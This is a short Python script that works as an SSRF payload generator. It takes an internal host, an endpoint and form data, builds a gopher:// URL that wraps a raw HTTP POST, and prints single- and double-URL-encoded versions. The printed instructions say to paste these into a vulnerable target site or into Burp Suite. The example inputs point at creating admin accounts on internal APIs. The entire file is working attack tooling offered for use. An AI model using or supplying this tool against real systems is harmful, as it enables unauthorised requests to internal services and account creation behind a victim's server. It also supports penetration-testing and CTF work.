#!/usr/bin/python3

def custom_url_encode(data, times=1):
    # Encode specified characters
    def encode_special_chars(s):
        replacements = {' ': '%20', '\n': '%0A', '&': '%26'}
        for original, encoded in replacements.items():
            s = s.replace(original, encoded)
        return s

    # Double encoding requires encoding '%' as '%25' on the second pass
    def double_encode_special_chars(s):
        # First, replace '%' from the first encoding to '%25'
        s = s.replace('%', '%25')
        # Then apply the original encoding replacements on top of this
        return encode_special_chars(s)

    encoded_data = data
    for i in range(times):
        if i == 0:  # First round of encoding
            encoded_data = encode_special_chars(encoded_data)
        else:  # Second round of encoding
            encoded_data = double_encode_special_chars(encoded_data)
    return encoded_data

def main():
    # User inputs
    internal_domain_ip = input("Provide `internal-domain:port`, do not specify protocol (Ex: localhost:80):\n")
    print("\n")
    endpoint = input("Provide `endpoint` that request will be sent to (Ex: /api/admin/create):\n")
    print("\n")
    data_sent = input("Provide `sent-data` (Ex:username=hehe&password=hehe):\n")

    # Extract domain/IP without port for the Host header
    internal_domain_ip_only = internal_domain_ip.split(':')[0]

    # Calculate content length
    content_length = len(data_sent)
    
    # Construct the payload gopher
    payload_gopher = f"gopher://{internal_domain_ip}/_POST {endpoint} HTTP/1.1\nHost: {internal_domain_ip_only}\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nContent-Length: {content_length}\n\n{data_sent}"

    print("\n\nOriginal Payload Gopher:")
    print("=====")
    print(payload_gopher)
    print("=====")
    
    # URL encoding one time
    url_encoded_1_time = custom_url_encode(payload_gopher, 1)
    print("\n\nFor URL-encoded-1-time: Paste directly on target-site, where SSRF happens")
    print("=====")
    print(url_encoded_1_time)
    print("=====")
    
    # URL encoding two times
    url_encoded_2_times = custom_url_encode(payload_gopher, 2)  # Properly encode the string a second time
    print("\nFor URL-encoded-2-times: Paste into burpsuite")
    print("=====")
    print(url_encoded_2_times)
    print("=====")

if __name__ == "__main__":
    main()
